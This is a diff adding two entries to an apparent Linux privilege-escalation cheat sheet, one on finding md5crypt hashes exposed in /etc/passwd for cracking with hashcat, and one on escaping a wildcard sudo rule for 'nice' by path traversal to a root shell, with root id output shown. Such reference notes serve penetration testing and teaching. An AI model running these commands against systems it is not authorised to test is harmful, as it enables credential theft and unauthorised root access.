@@ -70,6 +70,20 @@ searchsploit linux kernel 3.9
 | Scrypt | `$7$`... |
 | Argon2 | `$argon2i$`... |
 
+Normally the second field in `/etc/passwd` is `x`, with the password hash stored in `/etc/shadow`. Inspect the file for accounts whose second field contains a hash instead:
+
+```bash
+cat /etc/passwd
+```
+
+An entry beginning with `$1$` exposes a crackable md5crypt hash directly to an unprivileged user or through a local-file-read vulnerability:
+
+```text
+USER:$1$SALT$HASH:1001:1001:USER:/home/USER:/bin/bash
+```
+
+Hashcat mode `500` for md5crypt is documented in the [Hashcat guide](../tool-guides/hashcat.md).
+
 #### Users with Login Shells
 
 ```bash
@@ -1234,6 +1248,28 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 sudo /usr/bin/ftp
 !/bin/bash
+```
+
+### Sudo `nice` pathname traversal
+
+A sudo rule may constrain `nice` to executables beneath a root-owned directory by matching a path wildcard:
+
+```bash
+sudo -l
+# (ALL : ALL) /bin/nice /notes/*
+```
+
+Because the wildcard also matches path separators and `..` components, traverse out of the allowed directory and resolve the argument to `/bin/sh`:
+
+```bash
+sudo /bin/nice /notes/../../../../bin/sh
+id
+```
+
+Successful result:
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ### SSH
